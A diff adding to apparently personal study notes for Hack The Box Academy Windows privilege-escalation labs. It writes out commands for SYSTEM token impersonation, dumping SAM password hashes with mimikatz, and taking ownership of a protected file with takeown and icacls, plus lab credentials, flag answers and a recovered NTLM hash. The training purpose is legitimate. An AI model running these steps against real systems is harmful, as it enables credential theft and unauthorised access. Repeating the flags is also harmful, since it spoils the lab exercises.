@@ -142,4 +142,73 @@ type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
 
 Results: F3ar_th3_p0tato!
 
+**RDP to  with user "jordan" and password "HTB_@cademy_j0rdan!". Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account.**
+
+```
+xfreerdp /v:10.129.43.43 /u:jordan /p:HTB_@cademy_j0rdan! /cert:ignore
+
+. .\psgetsys.ps1 
+ImpersonateFromParentPid -ppid 612 -command "c:\Windows\System32\cmd.exe" -cmdargs ""
+
+# Now we open mimikatz (in tools)
+cd c:\Tools\mimikatz
+# And browse to the tool
+.\mimikatz.exe
+
+# Impersonate as NT Authority/SYSTEM (having permissions for it).
+token::elevate
+
+# List users and hashes of the machine
+lsadump::sam
+```
+
+Results: 64f12cddaa88057e06a81b54e73b949b
+
+
+**RDP to (ACADEMY-WINLPE-SRV01) with user "htb-student" and password "HTB_@cademy_stdnt!". Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.**
+
+```
+xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.43.43 /cert:ignore  
+# Check permissions
+whoami /priv
+
+# In the output we can see SeTakeOwnershipPrivilege is disabled. We will use the Enable-Privilege.ps1 and the EnableAllTokenPrivs.ps1 scripts to enable it.
+
+```
+
+See the scripts  in [windows-user-privileges](windows-user-privileges.md)
+
+```
+# Run the scripts to enable the SeTakeOwnershipPrivilege
+Import-module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+whoami /priv
+```
+
+And now it is enabled.
+
+```
+# Check out the target file to gather a bit more information about it.
+Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+# Checking File Ownership:
+cmd /c dir /q 'C:\TakeOwn\'
+
+# Taking Ownership of the File:
+takeown /f 'C:\TakeOwn\flag.txt'
+
+# Confirm change of ownership:
+Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+
+# We need to modify ACL to get to read the file.
+icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
+
+# Print out the file
+type 'C:\TakeOwn\flag.txt'
+```
+
+Results: 1m_th3_f1l3_0wn3r_n0W!
+
+
+### Windows Group Privileges
 
